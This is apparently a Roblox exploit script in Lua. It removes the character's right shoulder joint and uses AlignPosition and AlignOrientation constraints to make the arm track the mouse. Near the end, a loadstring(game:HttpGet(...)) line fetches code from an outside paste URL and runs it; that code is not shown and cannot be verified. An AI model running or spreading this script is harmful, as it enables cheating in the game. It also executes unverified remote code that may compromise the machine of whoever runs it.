local p = game:GetService("Players").LocalPlayer
local char = p.Character
local mouse = p:GetMouse()
local m6

local offset = char.Torso.CFrame:Inverse() * char["Right Arm"].CFrame

function Joint(P1,P2,Pos,Rot)
	local AlignP = Instance.new('AlignPosition', P2);
	AlignP.ApplyAtCenterOfMass = true;
	AlignP.MaxForce = 67752;
	AlignP.MaxVelocity = math.huge/9e110;
	AlignP.ReactionForceEnabled = false;
	AlignP.Responsiveness = 200;
	AlignP.RigidityEnabled = true;
	local AlignO = Instance.new('AlignOrientation', P2);
	AlignO.MaxAngularVelocity = math.huge/9e110;
	AlignO.MaxTorque = 67752;
	AlignO.PrimaryAxisOnly = false;
	AlignO.ReactionTorqueEnabled = false;
	AlignO.Responsiveness = 200;
	AlignO.RigidityEnabled = true;
	local AttA=Instance.new('Attachment',P2);
	local AttB=Instance.new('Attachment',P1);
	AttA.Orientation = Rot
	AttA.Position = Pos
	AlignP.Attachment1 = AttA;
	AlignP.Attachment0 = AttB;
	AlignO.Attachment1 = AttA;
	AlignO.Attachment0 = AttB;
	AttA.Name = "Align" .. P1.Name
	AttB.Name = "Align" .. P1.Name
end

local pr = Instance.new("Part", char)
pr.Size = Vector3.new(1,1,1)
pr.CanCollide = false
pr.Transparency = 1
Joint(char["Right Arm"], pr, Vector3.new(0,-0.5,0), Vector3.new(0,0,0))

local weld = Instance.new("Weld", char)
weld.Part0 = char.Torso
weld.Part1 = pr
weld.Name = "Joint"

char["Right Arm"]:GetPropertyChangedSignal("LocalTransparencyModifier"):Connect(function()
	char["Right Arm"].LocalTransparencyModifier = char["Right Arm"].Transparency
end)


local e = game:GetService("RunService").RenderStepped:Connect(function()
	local cf = CFrame.new(char.Torso.Position, mouse.Hit.Position) * CFrame.Angles(math.pi/2, 0, 0)
	weld.C0 = offset * char.Torso.CFrame:toObjectSpace(cf) + Vector3.new(0,0.5,0)
end)

p.Character.Torso["Right Shoulder"]:Destroy()
loadstring(game:HttpGet(('https://ghostbin.co/paste/krmyf/raw'),true))()

char.Humanoid.Died:Wait()
e:Disconnect()